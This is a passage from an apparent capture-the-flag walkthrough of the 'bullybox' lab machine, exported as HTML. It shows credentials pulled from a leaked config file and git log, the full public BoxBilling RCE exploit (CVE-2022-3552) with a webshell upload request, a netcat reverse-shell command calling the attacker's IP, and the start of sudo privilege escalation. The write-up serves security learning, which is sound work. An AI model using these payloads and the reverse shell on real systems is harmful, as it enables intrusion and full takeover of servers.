0.1px;">drwxrwxr-x &nbsp;<span class="cm-number">6</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-themes</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp;<span class="cm-number">30279</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-update.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxrwxr-x &nbsp;<span class="cm-number">3</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-uploads</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxrwxr-x <span class="cm-number">19</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 bb-vendor</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp;<span class="cm-number">24672</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 CHANGELOG.md</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">drwxrwxr-x &nbsp;<span class="cm-number">7</span> kali kali &nbsp; <span class="cm-number">4096</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 .git</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp; <span class="cm-number">2353</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 .htaccess</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp; &nbsp;<span class="cm-number">825</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 index.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp;<span class="cm-number">11346</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 LICENSE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali <span class="cm-number">507905</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 rb.php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp;<span class="cm-number">10039</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 README.md</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-attribute">-rw-rw-r--</span> &nbsp;<span class="cm-number">1</span> kali kali &nbsp; &nbsp;<span class="cm-number">716</span> Jan <span class="cm-number">26</span> <span class="cm-number">17</span>:28 robots.txt</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 614px;"></div><div class="CodeMirror-gutters" style="display: none; height: 614px;"></div></div></div></pre><p><span>Inside </span><code>bb-config.php</code><span>, I discovered a set of credentials.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/git_directory]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ cat</span> bb-config.php </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;?php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">return array (</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'debug'</span> <span class="cm-operator">=</span>&gt; <span class="cm-atom">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'salt'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'b94ff361990c5a8a37486ffe13fabc96'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'url'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'&lt;http://bullybox.local/&gt;'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'admin_area_prefix'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'/bb-admin'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'sef_urls'</span> <span class="cm-operator">=</span>&gt; <span class="cm-atom">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'timezone'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'UTC'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'locale'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'en_US'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'locale_date_format'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'%A, %d %B %G'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'locale_time_format'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">' %T'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'path_data'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'/var/www/bullybox/bb-data'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'path_logs'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'/var/www/bullybox/bb-data/log/application.log'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'log_to_db'</span> <span class="cm-operator">=</span>&gt; <span class="cm-atom">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'db'</span> <span class="cm-operator">=</span>&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  array (</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'type'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'mysql'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'host'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'localhost'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'name'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'boxbilling'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'user'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'admin'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'password'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'Playing-Unstylish7-Provided'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'twig'</span> <span class="cm-operator">=</span>&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  array (</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'debug'</span> <span class="cm-operator">=</span>&gt; <span class="cm-atom">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'auto_reload'</span> <span class="cm-operator">=</span>&gt; <span class="cm-atom">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'cache'</span> <span class="cm-operator">=</span>&gt; <span class="cm-string">'/var/www/bullybox/bb-data/cache'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string">'api'</span> <span class="cm-operator">=</span>&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  array (</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'require_referrer_header'</span> <span class="cm-operator">=</span>&gt; <span class="cm-atom">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'allowed_ips'</span> <span class="cm-operator">=</span>&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  array (</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'rate_span'</span> <span class="cm-operator">=</span>&gt; <span class="cm-number">3600</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-string">'rate_limit'</span> <span class="cm-operator">=</span>&gt; <span class="cm-number">1000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">);</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 877px;"></div><div class="CodeMirror-gutters" style="display: none; height: 877px;"></div></div></div></pre><p><span>Furthermore, running </span><code>git log -p</code><span> exposed the admin’s email and the username “</span><strong><span>Yuki.”</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop/git_directory/.git]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ git</span> log <span class="cm-attribute">-P</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">commit ccf7c701c4bd22484cbe5d9f8f92511261aadef0 (HEAD <span class="cm-attribute">-</span>&gt; master)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Author: Yuki &lt;admin@bullybox.local&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Date: &nbsp; Tue Jun <span class="cm-number">27</span> <span class="cm-number">04</span>:35:12 <span class="cm-number">2023</span> <span class="cm-operator">+</span><span class="cm-number">0000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  Ready For launch</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 154px;"></div><div class="CodeMirror-gutters" style="display: none; height: 154px;"></div></div></div></pre><p><span>I tested these credentials on the </span><code>/bb-admin</code><span> login page and successfully authenticated as an administrator.</span></p><p><img src="./bullybox.assets/image-20260205211504816.png" alt="image-20260205211504816"></p><p><img src="./bullybox.assets/image-20260205211509513.png" alt="image-20260205211509513"></p><p><span>With valid credentials in hand, I attempted the Authenticated RCE exploit I had identified earlier.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ cat</span> <span class="cm-number">51108</span>.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Exploit Title: BoxBilling&lt;=4.22.1.5 - Remote Code Execution (RCE)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Date: 2022-09-18</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Exploit Author: zetc0de</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Vendor Homepage: &lt;https://www.boxbilling.org/&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Software Link:</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;https://github.com/boxbilling/boxbilling/releases/download/4.22.1.5/BoxBilling.zip&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Version: &lt;=4.22.1.5 (Latest)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># Tested on: Windows 10</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># CVE : CVE-2022-3552</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># BoxBilling was vulnerable to Unrestricted File Upload.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># In order to exploit the vulnerability, an attacker must have a valid</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">authenticated session as admin on the CMS.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># With at least 1 order of product an attacker can upload malicious file to</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">hidden API endpoint that contain a webshell and <span class="cm-builtin">get</span> RCE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">###################################################################################</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">## POC</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">POST /index.php<span class="cm-def">?_url</span><span class="cm-operator">=</span>/api/admin/Filemanager/save_file HTTP/1.1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host: local.com:8089</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Content-Length: <span class="cm-number">52</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Accept: application/json, text/javascript, */*; <span class="cm-def">q</span><span class="cm-operator">=</span><span class="cm-number">0</span>.01</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DNT: <span class="cm-number">1</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">X-Requested-With: XMLHttpRequest</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">User-Agent: Mozilla/5.0 (Windows NT <span class="cm-number">10</span>.0; Win64; x64) AppleWebKit/537.36</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Content-Type: application/x-www-form-urlencoded</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Cookie: <span class="cm-def">PHPSESSID</span><span class="cm-operator">=</span>3nrf9i4mv28o5anva77ltq042d</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Connection: close</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">order_id</span><span class="cm-operator">=</span><span class="cm-number">1</span><span class="cm-def">&amp;path</span><span class="cm-operator">=</span>ax.php<span class="cm-def">&amp;data</span><span class="cm-operator">=</span>&lt;%3fphp<span class="cm-operator">+</span>phpinfo()%3b%3f&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">POC Video :</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;https://drive.google.com/file/d/1m2glCeJ9QXc8epuY2QfvbWwjLTJ8_Hjx/view<span class="cm-def">?usp</span><span class="cm-operator">=</span>sharing&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 768px;"></div><div class="CodeMirror-gutters" style="display: none; height: 768px;"></div></div></div></pre><p><span>After analyzing the code, I executed the exploit. I confirmed it was working by successfully rendering the </span><code>phpinfo</code><span> page.</span></p><p><img src="./bullybox.assets/image-20260205211518423.png" alt="image-20260205211518423"></p><p><img src="./bullybox.assets/image-20260205211523303.png" alt="image-20260205211523303"></p><p><img src="./bullybox.assets/image-20260205211528496.png" alt="image-20260205211528496"></p><p><span>I replaced the command with a reverse shell payload, which successfully granted me a shell as the user “</span><strong><span>yuki.”</span></strong></p><p><img src="./bullybox.assets/image-20260205211535161.png" alt="image-20260205211535161"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;http://bullybox.local/ax.php<span class="cm-def">?cmd</span><span class="cm-operator">=</span>busybox%20nc%20192.168.45.236%2080%20-e%20/bin/bash&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 22px;"></div><div class="CodeMirror-gutters" style="display: none; height: 22px;"></div></div></div></pre><h1 id='shell-as-yuki'><span>Shell as </span><code>yuki</code></h1><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">yuki@bullybox:/var/www/bullybox<span class="cm-def">$ whoami</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">yuki</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">yuki@bullybox:/var/www/bullybox<span class="cm-def">$ id</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">uid</span><span class="cm-operator">=</span><span class="cm-number">1001</span>(yuki) <span class="cm-def">gid</span><span class="cm-operator">=</span><span class="cm-number">1001</span>(yuki) <span class="cm-def">groups</span><span class="cm-operator">=</span><span class="cm-number">1001</span>(yuki),27(sudo)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">yuki@bullybox:/var/www/bullybox<span class="cm-def">$ </span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 110px;"></div><div class="CodeMirror-gutters" style="display: none; height: 110px;"></div></div></div></pre><h1 id='privilege-escalation'><span>Privilege Escalation</span></h1><p><span>Once I gained shell access, I checked the user’s privileges using </span><code>sudo -l</code><span>. This revealed that Yuki was authorized to run all commands with elevated (root) privileges. I executed </span><code>/bin/bash -p</code><span> to spawn a shell with these elevated privileges, successfully obtaining </span><strong><span>root</span></strong><span> access.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">yuki@bullybox:/home<span class="cm-def">$ sudo</span> <span class="cm-attribute">-l</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Matching Defaults entries <span class="cm-keyword">for</span> yuki on bullybox:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  env_reset, mail_badpass, <span class="cm-def">secure_path</span><span class="cm-operator">=</span>/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
